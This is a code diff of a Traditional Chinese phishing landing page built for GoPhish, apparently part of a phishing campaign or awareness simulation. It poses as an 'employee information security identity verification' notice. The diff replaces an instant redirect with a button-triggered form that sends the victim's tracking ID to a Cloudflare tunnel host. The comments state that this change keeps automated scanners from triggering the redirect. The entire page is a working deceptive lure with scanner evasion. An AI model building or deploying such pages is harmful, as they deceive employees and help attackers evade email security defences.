@@ -1,20 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hant">
 <head>
     <meta charset="utf-8">
     <title>Security Verification</title>
-    <script>
-        // 自動擷取郵件中 GoPhish 產生的個別追蹤參數 (?rid=xxxx)
-        const currentParams = window.location.search;
-        
-        // ⚠️ 請檢查並確認這串網址，是否為您目前 Cloudflare Tunnel 小黑窗顯示的最新網址
-        const targetCloudflare = "https://chicken-vpn-primarily-change.trycloudflare.com";
-        
-        // 瞬間執行背景跳轉，並將追蹤參數帶回您的 GoPhish
-        window.location.href = targetCloudflare + "/" + currentParams;
-    </script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f6f9; }
+        .container { background: white; padding: 40px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 450px; }
+        h2 { color: #24292e; margin-bottom: 10px; font-size: 22px; }
+        p { color: #586069; margin-bottom: 30px; font-size: 15px; line-height: 1.5; }
+        .btn-submit { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: 600; width: 100%; }
+        .btn-submit:hover { background-color: #005a9e; }
+    </style>
 </head>
 <body>
-    <p>正在載入安全連線，請稍候...</p>
+    <div class="container">
+        <h2>員工資訊安全身分驗證</h2>
+        <p>為了確保您的帳戶安全，請點擊下方按鈕以完成年度系統查核與安全性驗證程序。</p>
+        
+        <!-- 核心改變：改用表單提交，動態將資料送回您的 Cloudflare Tunnel -->
+        <form id="phishForm" method="POST">
+            <input type="submit" class="btn-submit" value="點擊此處繼續驗證">
+        </form>
+    </div>
+
+    <script>
+        // 1. 自動擷取郵件中 GoPhish 產生的個別追蹤參數 (?rid=xxxx)
+        const currentParams = window.location.search;
+        
+        // 2. 您的 Cloudflare Tunnel 網址 (請確保目前小黑窗顯示的是這一個)
+        const targetCloudflare = "https://chicken-vpn-primarily-change.trycloudflare.com";
+        
+        // 3. 關鍵修正：不自動跳轉！而是將目標網址與追蹤參數，寫入到 form 表單的 action 屬性中
+        // 這樣只有當「人類」親自用滑鼠按下按鈕時，瀏覽器才會把請求送回 GoPhish
+        document.getElementById("phishForm").action = targetCloudflare + "/" + currentParams;
+    </script>
 </body>
 </html>
